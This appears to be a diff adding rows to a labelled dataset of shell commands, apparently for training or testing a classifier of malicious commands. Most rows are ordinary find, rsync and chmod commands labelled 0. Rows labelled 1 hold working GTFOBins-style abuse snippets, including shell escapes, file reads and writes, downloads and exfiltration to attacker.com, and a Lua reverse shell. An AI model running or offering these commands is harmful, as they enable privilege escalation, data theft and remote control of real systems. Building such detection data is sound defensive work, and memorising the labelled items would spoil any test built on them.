+485,find . -name '*.c' -ls,0
+486,find $HOME -mtime -2 -mtime +1,0
+487,"sudo mount -t vfat -o rw,auto,user,fmask=0000,dmask=0000 /dev/sda7 /mnt/my_partition",0
+488,find . -exec grep chrome {} \;,0
+489,find $SrvDir* -maxdepth 0 -type d,0
+490,"TF=$(mktemp -d)
+echo '{""scripts"": {""preinstall"": ""/bin/sh""}}' > $TF/package.json
+npm -C $TF i",1
+491,rsync -avR $i /iscsi;,0
+492,"find $1 -name ""$2"" | grep -v '/proc' | xargs grep -Hn ""$3"" {} \;",0
+493,read -u 4 line,0
+494,rsync -avz tata/ tata2/,0
+495,find -type f -mtime 61 -exec ls -ltr {} \;,0
+496,"find . -type f -iname '*'""$*""'*' -ls",0
+497,find . -name tests -prune -o -type f -name '*.php' | xargs wc -l,0
+498,find /path/to/dest -type d \( ! -name tmp \) -print,0
+499,"find ""${S}/bundled-libs"" \! -name 'libbass.so' -delete",0
+500,read VARNAME,0
+501,find /usr -name doc -type d,0
+502,"debugfs
+!/bin/sh",1
+503,find . -name .DS_Store -exec rm {} \;,0
+504,"grep [option] ""text string to search” directory-path",0
+505,split --number=l/6 ${fspec} xyzzy.,0
+506,find . -path '*/lang/en.css' -prune -o -name '*.css' -print,0
+507,"LFILE=file_to_read
+uuencode ""$LFILE"" /dev/stdout | uudecode",1
+508,"find . -type f ! -name ""*1"" ! -name ""*2"" -print",0
+509,find debian/fglrx/ -name 'fglrx-libglx*',0
+510,"join -o 1.1,1.2,1.3,2.1,2.2,2.3 -j2 <(sort -k2 file1) <(sort -k2 file2)",0
+511,find . -path ./proc -prune -or -path ./sys -prune -or -path ./run -prune  -or -iname '*start*' -print,0
+512,"mkdir ~/Labs/lab4a/folder{1,2,3}",0
+513,find /your/dir -type f -size +5M -exec du -h '{}' + | sort -hr,0
+514,"proc_load_average=$(w | head -1 | cut -d"" "" -f12 | cut -d"","" -f1-2 | tr ',' '.')",0
+515,find . -name '*.[ch]' | xargs grep -l thing,0
+516,find -name '*.undo' -exec wc -c {} + | tail -n 1,0
+517,"LFILE=file_to_read
+pr -T $LFILE",1
+518,find . -regex '.*\.\(cpp\|h\)',0
+519,find . -type f -iname '*.cpp' -exec mv {} ./test/ \;,0
+520,finger |  cut --complement -c36-40,0
+521,find / -type f -exec grep bananas {} \; -print,0
+522,find .  -perm 775,0
+523,"echo ""$(pwd)/$(basename ""$1"")""",0
+524,find . -type f -iname ‘HSTD*’ -daystart -mtime 1 -exec cp {} /path/to new/dir/ \;,0
+525,find . -maxdepth 1 -type d -exec ls -dlrt {} \;,0
+526,find . -type f -exec chmod 644 {} \;,0
+527,find . -type f -iname '*.mp3' -exec rename '/ /_/'  {} \;,0
+528,find -xtype l,0
+529,"find . -type f ! -name '*.gz' -exec gzip ""{}"" \;",0
+530,find . type -f -amin +2,0
+531,"find A -type d \( ! -wholename ""A/a/*"" \)",0
+532,sudo chown nobody /var/www/html/mysite/tmp_file_upload/,0
+533,"LFILE=file_to_write
+HISTIGNORE='history *'
+history -c
+DATA
+history -w $LFILE",1
+534,"find /mnt/usb -name  ""*.mp3"" -print",0
+535,ls | xargs -i mv {} unix_{},0
+536,find . -type f -iname '*.txt' -print0 | xargs -0 mv {} {}.abc,0
+537,"/usr/bin/find /home/user/Series/ -iname ""*sample*"" -exec rm {} \;",0
+538,find . -inum 128128 | xargs rm,0
+539,"find /dir/to/search/ -type f -iname "".*"" -ls",0
+540,ps -ef | grep postgres,0
+541,"LFILE=file_to_write
+TF=$(mktemp)
+echo DATA > ""$TF""
+tar c --xform ""s@.*@$LFILE@"" -OP ""$TF"" | tar x -P",1
+542,find /home/username/public_html/themes -type d -exec chmod 750 {} +,0
+543,find . -name '.svn' -prune -o -type f -printf '%m%c%p' | md5sum,0
+544,ln -s newtarget temp,0
+545,find / -mtime 50,0
+546,find -amin 30,0
+547,find / -executable,0
+548,chgrp -R shared_group /git/our_repos,0
+549,cat folder_list.txt | xargs mkdir,0
+550,find . -name \*.sql -not -samefile $oldest_to_keep -not -newer $oldest_to_keep,0
+551,hostname myServersHostname,0
+552,find / -size +10000k,0
+553,"find /etc /srv \! -path ""./srv/tftp/pxelinux.cfg*"" -a \! -name /etc/mtab",0
+554,"find . -type d -name ""mydir"" -exec touch '{}/abc.txt' \;",0
+555,"find . -type f -name ""*.php""",0
+556,find /path/to/your/directory -regex '.*\.\(avi\|flv\)',0
+557,find . -perm /222,0
+558,find MyApp.app -name Headers -type d -delete,0
+559,vim -c ':!/bin/sh',1
+560,find /path/to/dir/ -type f ! -perm 0644 -print0 | xargs -0 chmod 644,0
+561,"df $path_in_question | grep "" $path_in_question$""",0
+562,find . -ls,0
+563,tempfile=$(mktemp $(pwd)/templateXXXXXX),0
+564,find -group compta,0
+565,find . -type f -not -empty | wc -l,0
+566,seq -s % 4|tr -d '[:digit:]',0
+567,find . -regextype posix-egrep -regex '^.*/[a-z][^/]*$' -type f,0
+568,find . -type f -mtime -1,0
+569,"find . -type f -name ""Foo*"" -exec rm {} \;",0
+570,find . -type f -atime 7,0
+571,ls -1tr * | tail -1,0
+572,find wordpress -name '*js',0
+573,find . -name \*.php -type f -print0 | xargs -0 -n1 grep -Hn '$test' | wc -l,0
+574,"find /home -type f -printf ""%i@%p\n""",0
+575,curl https://raw.github.com/creationix/nvm/master/install.sh | sh,0
+576,chmod +x pretty-print,0
+577,"find / -xdev -name ""*.log""",0
+578,rpm --pipe '/bin/sh 0<&1',1
+579,"echo ""$(date +%H:%M:%S): done waiting. both jobs terminated on their own or via timeout; resuming script""",0
+580,"mkdir -p folder$( seq -s ""/folder"" 999 )1000",0
+581,"find / \( -perm -4000 -fprintf /root/suid.txt '%#m %u %p\n' \) , \  \( -size +100M -fprintf /root/big.txt '%-10s %p\n' \)",0
+582,"echo ""He likes cats, really?"" | fold -w1 | sort -u",0
+583,cat $file | wc -c,0
+584,read -p 'BGG enter something:' -r data,0
+585,"find /etc -type f | xargs grep -l -i ""damian""",0
+586,"find ""/proc/$pid/fd"" -ignore_readdir_race -lname ""$save_path/sess_\*"" -exec touch -c {}",0
+587,cat /var/run/dmesg.boot | grep Features,0
+588,find ~/ -atime +100 -exec rm -i {} ;,0
+589,"TF=$(mktemp -d)
+certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'",1
+590,"TF=$(mktemp)
+echo '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}' >$TF
+strings tmp.dvi",1
+591,gzip -l archive.tar.gz,0
+592,cat $1.tmp | sort -u,0
+593,mount -l -t nfs4,0
+594,mv `ls` /foo,0
+595,diff -y a b,0
+596,find /var/tmp/stuff -mtime +90 -execdir /bin/rm {} \+,0
+597,"rsync --iconv=UTF-8,UTF-8-MAC /home/username/path/on/server/ 'username@your.ip.address.here:/Users/username/path/on/machine/'",0
+598,abspath=$(readlink -m $path),0
+599,find . -type d -name aa -prune,0
+600,"find ""`echo ""$some_dir""`"" -maxdepth 0 -empty",0
+601,find . -name *.pdf | xargs tar czvf /root/Desktop/evidence/pdf.tar,0
+602,"DBPREFIX=""$(hostname -s).mysqldb""",0
+603,find file -chour +1 -exit 0 -o -exit 1,0
+604,"tree -P ""*foo""",0
+605,"find / -type f -printf ""\n%AD %AT %p"" | head -n 11",0
+606,kill -9 16085,0
+607,"find . -name "".txt""",0
+608,"month=$(cal | head -1 | grep -oP ""[A-Za-z]+"")",0
+609,"run-mailcap --action=view /etc/hosts
+!/bin/sh",1
+610,basename /home/jsmith/base.wiki .wiki,0
+611,dig mx example.com | grep -v '^;' | grep example.com,0
+612,find . name *foo,0
+613,"LFILE=file_to_read
+ptx -w 5000 ""$LFILE""",1
+614,history | head -n 120 | tail -n 5,0
+615,chmod -R 777 ../tools,0
+616,chmod 644 `find . -type f`,0
+617,find /dev/sd*[a-z] -printf . | wc -c,0
+618,"PS1=""`hostname`:\!>""",0
+619,find ~/test -type d -exec basename {} \;,0
+620,"find ${DIR} -type f -regex "".*\.${TYPES_RE}""",0
+621,find . — size +10 -print,0
+622,tar -I 7zhelper.sh -cf OUTPUT_FILE.tar.7z paths_to_archive,0
+623,"export URL=http://attacker.com/file_to_get
+export LFILE=file_to_save
+vim -c ':py import vim,sys; from os import environ as e
+if sys.version_info.major == 3: import urllib.request as r
+else: import urllib as r
+r.urlretrieve(e[""URL""], e[""LFILE""])
+vim.command("":q!"")'",1
+624,cat file | fold -w29 | head -1,0
+625,mkdir /etc/cron.5minute,0
+626,find . -exec grep foo {} +,0
+627,od file-with-nulls | grep ' 000',0
+628,find ~ -name 'Foto*',0
+629,find . -type f -name '*.ini',0
+630,pstree -p $$,0
+631,find /some/path -type f ! -perm -111 -ls,0
+632,find . -type f -mtime +1,0
+633,find . -name 'cmn-*\.flac' -print | grep -P './cmn-[\x4e00-\x9fa5]\.flac',0
+634,which cc,0
+635,touch index.html,0
+636,find /path/to/dir -type f -exec chmod 644 {} +,0
+637,"find downloads  -iname ""*.gif""",0
+638,chmod g+w * ...*,0
+639,find . -mtime -14 -ls,0
+640,find directory -mindepth 1 -type d -empty -delete,0
+641,find . -name *.o -perm 664 -print,0
+642,find / -nouser,0
+643,find -type f -perm -110,0
+644,diff -dbU0 a b,0
+645,"find -printf ""%y %i %prn""",0
+646,"find ""Test Folder"" -type d -name .dummy -exec rm -rf \""{}\"" \;",0
+647,echo abc | od -A n -v -t x1 | tr -d ' \n',0
+648,find . -name file1 -or -name file9,0
+649,find $INTRANETDESTINATION/weekly -mtime +32 -exec rm {} \;,0
+650,sudo su -l oracle,0
+651,"find . -name ""*.c"" | xargs grep pattern",0
+652,echo $(readlink -f /dev/disk/by-uuid/$1) is mounted,0
+653,find . -type f -name '*.java' -ls | sort -k +7 -r,0
+654,find . -type f -print0 | xargs -0 -n1 -P4 bzip2,0
+655,find . -exec wc -l {} \;,0
+656,find ~ -user dave -print,0
+657,ln -s $HOME/downloads/fnord $HOME/bin/,0
+658,find / -nogroup,0
+659,sudo find ./bootstrap/cache/ -type d -exec chown apache:laravel {} \;,0
+660,"find ./ -type f -print -exec grep -n -i ""stringYouWannaFind"" {} \;",0
+661,"find .  -name ""*.groovy"" -not -path ""./target/*"" -print",0
+662,"find . -name ""accepted_hits.bam""",0
+663,find -mtime 2,0
+664,find /opt -mtime 20,0
+665,find . ... -exec cat {} \; -exec echo \;,0
+666,find . -mtime -7 \( '*.jpg' -o -name '*.png' \),0
+667,find . ! -name . -prune,0
+668,find . -print0 | xargs -0 touch,0
+669,find . -iname foo -type d,0
+670,diff -ENwbur repos1/ repos2/,0
+671,"rm -rf /usr/local/{lib/node{,/.npm,_modules},bin,share/man}/npm*",0
+672,find /home/luser -type f -name '*.mpg' -print0 | xargs -0 rm -f,0
+673,"find . -type f -regex "".+-[0-9]+x[0-9]+\.jpg""",0
+674,find . -name file1 -print,0
+675,find / -nouser -print,0
+676,"dirname ""/path/to/vm.vmwarevm/vm.vmx""",0
+677,"seq 10 | paste -sd"" \n"" -",0
+678,find /directory/ -maxdepth 1 -type d -print| wc -l,0
+679,"find . -mtime -7 -name ""*.html""",0
+680,shopt dotglob,0
+681,echo `seq $start $end`,0
+682,sg $(id -ng),1
+683,"tac a.csv | sort -u -t, -r -k1,1 |tac",0
+684,ls `which gcc` -al,0
+685,"find /path/to/dir -name ""test"" -type d -exec rm -rf {} \;",0
+686,find . -maxdepth 1 -type f | md5sum,0
+687,"export LPORT=12345
+export LFILE=file_to_save
+vimdiff -c ':lua local k=require(""socket"");
+  local s=assert(k.bind(""*"",os.getenv(""LPORT"")));
+  local c=s:accept();
+  local d,x=c:receive(""*a"");
+  c:close();
+  local f=io.open(os.getenv(""LFILE""), ""wb"");
+  f:write(d);
+  io.close(f);'",1
+688,scp -c blowfish -r user@your.server.example.com:/path/to/foo /home/user/Desktop/,0
+689,find folder* -name '*.a' -print | cpio -pvd /path/to/dest,0
+690,"find /mnt/zip -name ""*prefs copy"" -print | xargs rm",0
+691,find ./ -daystart -mtime -3 -type f  ! -mtime -1  -printf '%TY %p\n',0
+692,find / -size +100M,0
+693,"ln -s ""../config/environments""",0
+694,"find . -type d -name ""?????????????????????????????????""",0
+695,rsync --exclude='B/' --exclude='C/' . anotherhost:/path/to/target/directory,0
+696,find . -print | grep '\.java',0
+697,"URL=http://attacker.com/file_to_download
+ab -v2 $URL",1
+698,find . -mtime -30 -print,0
+699,read -rsp $'Press any key to continue...\n' -n 1 key,0
+700,sash,1
+701,cat commands-to-execute-remotely.sh | ssh blah_server,0
+702,"find . -perm u=rwx,g=rx,o=rx",0
+703,sudo cat /sys/kernel/debug/tracing/trace_pipe | tee tracelog.txt,0
+704,"find . -name ""*.csv""",0
+705,cat file | grep pattern | paste -sd' ',0
+706,bind -r '\e',0
+707,split --suffix-length=5 --lines=1 foo.txt,0
+708,df -k /dir/inner_dir/,0
+709,find . -type f -empty,0
+710,find /usr -name \*.sh,0
+711,find /var -maxdepth 2 -type d;,0
+712,"find . -exec echo -n '""{}"" ' \;",0
+713,find -name '*.[ch]' | xargs grep -E 'expr',0
+714,"terraform console
+file(""file_to_read"")",1
+715,find . -iregex '.*sitesearch.*' -iregex '.*demo.*',0
+716,find $1 -perm -u+x -exec chmod g+x {} \;,0
+717,fold -w 10,0
+718,"export LPORT=8888
+gdb -nx -ex 'python import sys; from os import environ as e
+if sys.version_info.major == 3: import http.server as s, socketserver as ss
+else: import SimpleHTTPServer as s, SocketServer as ss
+ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever()' -ex quit",1
+719,tail -f /var/log/some.log | grep --line-buffered foo | grep bar,0
+720,find /var/log/ -iname anaconda.*,0
+721,"echo ""$line"" | column -t",0
+722,"RHOST=attacker.com
+RPORT=8080
+LFILE=file_to_send
+nmap -p $RPORT $RHOST --script http-put --script-args http-put.url=/,http-put.file=$LFILE",1
+723,find ~/ -newer alldata.tar 	-exec tar uvf alldata.tar {} \;,0
+724,find . -name '*js' -exec grep -n 'some string' {} \;,0
+725,"export LFILE=file_to_write
+zsh -c 'echo DATA >$LFILE'",1
+726,find $FILE -type f -mtime 30 -exec gzip {} \;,0
+727,"find . -name ""*.[ch]"" -exec grep --color -aHn ""e"" {} \;",0
+728,find . \( -name a.out -o -name '*.o' -o -name 'core' \) -exec rm {} \;,0
+729,mktemp -d -p /path/to/dir,0
+730,find / -iname 'process.txt' -print,0
+731,"find / -user edwarda -ok rm ""{}"" \;",0
+732,"chown $FUID:$FGID ""$FILE2""",0
+733,"LFILE=file_to_read
+sort -m ""$LFILE""",1
+734,"LFILE=file_to_read
+head -c1G ""$LFILE""",1
+735,"cut -d, -f1 file | uniq | xargs -I{} grep -m 1 ""{}"" file",0
+736,find /your/project -type f ! -name 'CONFIGFILE' -exec ln -s \{\} ./ \;,0
+737,"export RHOST=attacker.com
+export RPORT=12345
+export LFILE=file_to_get
+ksh -c '{ echo -ne ""GET /$LFILE HTTP/1.0\r\nhost: $RHOST\r\n\r\n"" 1>&3; cat 0<&3; } \
+    3<>/dev/tcp/$RHOST/$RPORT \
+    | { while read -r; do [ ""$REPLY"" = ""$(echo -ne ""\r"")"" ] && break; done; cat; } > $LFILE'",1
+738,chgrp forge /var/run/fcgiwrap.socket,0
+739,ls -b,0
+740,"find . -type f -name ""FILE-TO-FIND"" -exec rm -f {} \;",0
+741,find . -type f -mtime +31 -print0 | xargs -0 -r rm -f,0
+742,find . -maxdepth 1 -type d | xargs -I X mkdir '/new/directory/X',0
+743,"find . -newermt ""5 days""",0
+744,"echo ""$NEWFILE"" | sudo tee /etc/apt/sources.list",0
+745,mv /usr/bin/openssl /root/,0
+746,find . | grep -qi /path/to/something[^/]*$,0
+747,find . -maxdepth 1 -name '[!.]*' -printf 'Name: %16f Size: %6s\n',0
+748,find / -type d -gid  100,0
+749,find . -size -9k,0
+750,find . -type f -not -name '*txt' -print0 | xargs -0 rm --,0
+751,"find . -name ""*.js""",0
+752,pwd | tr '/' '\n',0
+753,"find . -name ""*.so"" -printf ""mv '%h/%f' '%h/lib%f'\n"" | bash",0
+754,comm -12 ignore.txt input.txt,0
+755,"find /path -perm -g+w,o+w",0
+756,"TF=$(mktemp -d)
+echo 'raise Exception(open(""file_to_read"").read())' > $TF/setup.py
+pip install $TF",1
+757,"LFILE=file_to_read
+nawk '//' ""$LFILE""",1
+758,find . -user daniel,0
+759,find $from_dir -mindepth 3 -maxdepth 3 -type d,0
+760,ls -lb,0
+761,"LFILE=file_to_read
+alpine -F ""$LFILE""",1
+762,ls -1 | grep -v ^$EXCLUDE | xargs -I{} mv {} $TARGET,0
+763,find /full/path/dir -name '*.txt' -exec /bin/rm {} \;,0
+764,find ./ -path ./beta/* -prune -o -iname example.com -print,0
+765,"TF=$(mktemp -d)
+echo 'CALL ""SYSTEM"" USING ""/bin/sh"".' > $TF/x
+cobc -xFj --frelax-syntax-checks $TF/x",1
+766,find / -name '#*' -atime +7 -print | xargs rm,0
+767,find . -type f -print | xargs grep -li 'bin/ksh',0
+768,"file -ib ""$file""",0
+769,"TF=$(mktemp -d)
+echo 'exec(""/bin/sh"")' > $TF/x.rb
+FACTERLIB=$TF facter",1
+770,find  . -name '*.bak' -ls,0
+771,cd $(dirname $(which ssh));,0
+772,"LFILE=file_to_write
+echo DATA | openssl enc -out ""$LFILE""",1
+773,"cp -Rp ""$appname.app"" Payload/",0
+774,"find /var/www/vhosts/*/httpdocs -type f -iwholename ""*/wp-includes/version.php"" -exec grep -H ""\$wp_version ="" {} \;",0
+775,comm -23 file1 file2,0
+776,a=`w|cut -d' ' -f1`;,0
+777,gzip -d file.gz,0
+778,cd $(dirname $(readlink -f $0)),0
+779,find ${userdir}/${i}/incoming -mtime +2 -type f -size +200557600c -ls,0
+780,rm -rf *~important-file,0
+781,dirname `find / -name ssh | grep bin`,0
+782,"subnet=$(hostname -i | cut -d. -f1,2,3)",0
+783,ls -l /boot/grub/*.mod | wc -l,0
+784,find -mindepth 2 -maxdepth 3 -name file,0
+785,find {} -type f -depth 1 -perm +0111 | sort -r,0
+786,find . -type f,0
+787,shred -v -n 1 /path/to/your/file #overwriting with random data,0
+788,find / -name *.class -printf '%h\n' | sort --unique,0
+789,grep -of ignore.txt input.txt | sort | uniq -c,0
+790,"apt-get changelog apt
+!/bin/sh",1
+791,"cd `find . -name ""config""`",0
+792,"find . -name ""*.cc"" -print -exec grep ""xxx"" {} \;",0
+793,watch -d ls -l,0
+794,find . -perm 664,0
+795,find . -name '*.ear' -exec du -h {} \;,0
+796,find -s,0
+797,rename 's/^fgh/jkl/' fgh*,0
+798,sudo chown -R `whoami` /usr/local/lib/node_modules,0
+799,find .cache/chromium/Default/Cache/ -mindepth 1 -size +100M -delete,0
+800,"find . ! -wholename ""./etc*""",0
+801,"read -e -p ""Enter your choice: "" choice",0
+802,find ~music -type f -iname *.mp3 | wc -l,0
+803,sudo chown -R $(whoami):admin /usr/local,0
+804,du -ks * | sort -n -r,0
+805,find . -type f -ctime $FTIME,0
+806,find . -type f -inum 314167125 -delete,0
+807,find . -name 'some_text_2014.08.19*',0
+808,find ~/backups/mydatabasename/* -mtime +30 -exec rm {} \;,0
+809,find /users/tom -name '*.p[lm]' -exec grep -l -- '->get(' {} + | xargs grep -l '#hyphenate',0
+810,find . -name ‘*ITM*’,0
+811,"cat file.txt | rev | cut -d ',' -f 2 | rev",0
+812,chown -R user:www-data yourprojectfoldername,0
+813,find $STARTDIR -name '*.ps' -print,0
+814,"find . -mtime 7 -name ""*.html"" -print",0
+815,comm -23 <(sort file1.txt) <(grep -o '^[^;]*' file2.txt | sort),0
+816,"export RHOST=attacker.com
+export RPORT=12345
+rvim -c ':lua local s=require(""socket""); local t=assert(s.tcp());
+  t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));
+  while true do
+    local r,x=t:receive();local f=assert(io.popen(r,""r""));
+    local b=assert(f:read(""*a""));t:send(b);
+  end;
+  f:close();t:close();'",1
+817,"puppet apply -e ""exec { '/bin/sh -c \""exec sh -i <$(tty) >$(tty) 2>$(tty)\""': }""",1
+818,find . -name '*~' | xargs rm,0
+819,find . -type f | tac,0
+820,who -m,0
+821,sudo cp -a libgtest_main.so libgtest.so /usr/lib/,0
+822,"export LPORT=8888
+python -c 'import sys; from os import environ as e
+if sys.version_info.major == 3: import http.server as s, socketserver as ss
+else: import SimpleHTTPServer as s, SocketServer as ss
+ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever()'",1
+823,find /home/madhu/release/workspace -type d -name '.git',0
+824,"iftop
+!/bin/sh",1
+825,find -iname '.#*',0
+826,find /usr/bin -type f -size -50c -exec ls -l '{}' ';',0
+827,find . '(' -name FOLDER1 -prune -o -name filename ')' -print,0
+828,who | wc -l,0
+829,cat `which java` | file -,0
+830,find . -newer CompareFile -print,0
+831,find . -type f -exec file {} \+;,0
